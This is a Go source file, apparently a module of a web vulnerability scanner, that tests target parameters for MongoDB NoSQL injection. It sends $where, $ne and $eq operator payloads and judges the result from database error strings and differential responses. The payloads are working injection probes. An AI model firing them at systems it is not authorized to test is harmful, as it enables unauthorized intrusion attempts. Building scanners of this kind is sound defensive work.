package modules

import (
	"fmt"
	"nightfalllx/pkg/client"
	"regexp"
	"strings"
)

type NoSQLiModule struct{}

func NewNoSQLiModule() *NoSQLiModule {
	return &NoSQLiModule{}
}

func (m *NoSQLiModule) Name() string {
	return "nosqli"
}

func (m *NoSQLiModule) Description() string {
	return "NoSQL (MongoDB) Injection via query operator differential and error disclosure"
}

var mongoErrorRegex = regexp.MustCompile(`(?i)(MongoError|MongoServerError|Can't canonicalize query|Cannot use '\$|unknown operator: \$|BSONObj size|Cast to ObjectId failed|syntax error near.*mongo)`)

func (m *NoSQLiModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	headers := map[string]string{}
	if target.IsJSON {
		headers["Content-Type"] = "application/json"
	}

	for _, param := range target.Parameters() {
		// 1. Error-based probe: inject malformed operator
		malformedPayload := `{"$where": "this"}`
		var errResp *client.Response
		var err error
		if isPost {
			errResp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, malformedPayload), headers)
		} else {
			errResp, err = c.Request("GET", target.BuildURLWithParam(param, malformedPayload), "", nil)
		}

		if err == nil && errResp != nil && mongoErrorRegex.MatchString(errResp.Body) {
			evidence := mongoErrorRegex.FindString(errResp.Body)
			f := &Finding{
				Module:      m.Name(),
				Title:       "Error-Based NoSQL (MongoDB) Injection",
				Severity:    SeverityHigh,
				URL:         target.URL,
				Parameter:   param,
				Payload:     malformedPayload,
				Detail:      fmt.Sprintf("Disclosed database engine error via injected NoSQL operator: '%s'", evidence),
				Evidence:    evidence,
				Remediation: "Sanitize user input and prevent passing raw objects into NoSQL query constructors.",
				CWEID:       943,
			}
			f.SetConfidence(ConfidenceConfirmed)
			findings = append(findings, f)
			continue
		}

		// 2. Differential probe: True vs False condition ($ne vs $eq)
		if target.IsJSON {
			trueJSONPayload := `{"$ne": "nflx_nonexistent_9999"}`
			falseJSONPayload := `{"$eq": "nflx_nonexistent_9999"}`

			trueResp, _ := c.Request("POST", target.URL, target.BuildBodyWithParam(param, trueJSONPayload), headers)
			falseResp, _ := c.Request("POST", target.URL, target.BuildBodyWithParam(param, falseJSONPayload), headers)

			if trueResp != nil && falseResp != nil {
				if trueResp.StatusCode == 200 && (falseResp.StatusCode != 200 || Similarity(trueResp.Body, falseResp.Body) < 0.60) {
					f := &Finding{
						Module:      m.Name(),
						Title:       "Differential Boolean NoSQL (MongoDB) Injection in JSON",
						Severity:    SeverityHigh,
						URL:         target.URL,
						Parameter:   param,
						Payload:     trueJSONPayload,
						Detail:      fmt.Sprintf("JSON parameter '%s' evaluated MongoDB $ne operator differentially (True: %d, False: %d).", param, trueResp.StatusCode, falseResp.StatusCode),
						Evidence:    fmt.Sprintf("True status: %d (bytes: %d) vs False status: %d (bytes: %d)", trueResp.StatusCode, trueResp.Bytes, falseResp.StatusCode, falseResp.Bytes),
						Remediation: "Validate JSON leaves against strict primitive schemas.",
						CWEID:       943,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
					continue
				}
			}
		} else {
			trueParam := fmt.Sprintf("%s[$ne]", param)
			falseParam := fmt.Sprintf("%s[$eq]", param)

			var trueResp, falseResp *client.Response
			if isPost {
				trueResp, _ = c.Request("POST", target.URL, target.BuildDataWithParam(trueParam, "nflx_nonexistent_9999"), nil)
				falseResp, _ = c.Request("POST", target.URL, target.BuildDataWithParam(falseParam, "nflx_nonexistent_9999"), nil)
			} else {
				trueResp, _ = c.Request("GET", target.BuildURLWithParam(trueParam, "nflx_nonexistent_9999"), "", nil)
				falseResp, _ = c.Request("GET", target.BuildURLWithParam(falseParam, "nflx_nonexistent_9999"), "", nil)
			}

			if trueResp != nil && falseResp != nil {
				if trueResp.StatusCode == 200 && (falseResp.StatusCode != 200 || Similarity(trueResp.Body, falseResp.Body) < 0.60) {
					f := &Finding{
						Module:      m.Name(),
						Title:       "Differential Boolean NoSQL (MongoDB) Injection",
						Severity:    SeverityHigh,
						URL:         target.URL,
						Parameter:   param,
						Payload:     fmt.Sprintf("%s[$ne]=nflx_nonexistent_9999", param),
						Detail:      fmt.Sprintf("Parameter '%s' evaluated injected NoSQL operator '$ne' differentially (True: %d, False: %d).", param, trueResp.StatusCode, falseResp.StatusCode),
						Evidence:    fmt.Sprintf("True status: %d (bytes: %d) vs False status: %d (bytes: %d)", trueResp.StatusCode, trueResp.Bytes, falseResp.StatusCode, falseResp.Bytes),
						Remediation: "Ensure input parameters are strictly validated as primitive strings rather than objects or query selector hashes.",
						CWEID:       943,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
				}
			}
		}
	}

	return findings, nil
}
